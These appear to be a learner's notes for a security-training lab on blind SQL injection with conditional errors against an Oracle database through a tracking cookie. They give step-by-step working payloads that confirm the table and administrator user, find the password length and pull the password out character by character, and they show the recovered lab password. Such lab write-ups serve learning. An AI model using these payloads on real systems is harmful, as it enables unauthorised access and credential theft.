Lab #12 - Blind SQL injection with conditional errors

Vulnerable parameter - tracking cookie

End Goals:
- Output the administrator password
- Login as the administrator user

Analysis:

1) Prove that parameter is vulnerable 

'|| (select '' from dual) || ' -> oracle database

'|| (select '' from dualsldfjsd) || ' -> error


2) Confirm that the users table exists in the database

'|| (select '' from users where rownum = 1) || '
-> users table exists


3) Confirm that the administratro user exists in the users table
'|| (select '' from users where username='administrator') || '

' || (select CASE when (1=0) then TO_CHAR(1/0) ELSE '' END from dual) || '

' || (select CASE when (1=1) then TO_CHAR(1/0) ELSE '' END from users where username='administrator') || '
-> Internal server error -> administrator user exists

' || (select CASE when (1=1) then TO_CHAR(1/0) ELSE '' END from users where username='klsjdlfjsjdf') || '
-> 200 response -> user does not exist in database


4) Determine length of password
' || (select CASE when (1=1) then TO_CHAR(1/0) ELSE '' END from users where username='administrator' and LENGTH(password)>19) || '
-> 200 response at 50 -> length of password is less than 50
-> 20 characters


5) Output the administrator password

' || (select CASE when (1=1) then TO_CHAR(1/0) ELSE '' END from users where username='administrator' and substr(password,1,1)='a') || '

zzn86hhw6fm8rqbn3v5q


script.py <url>
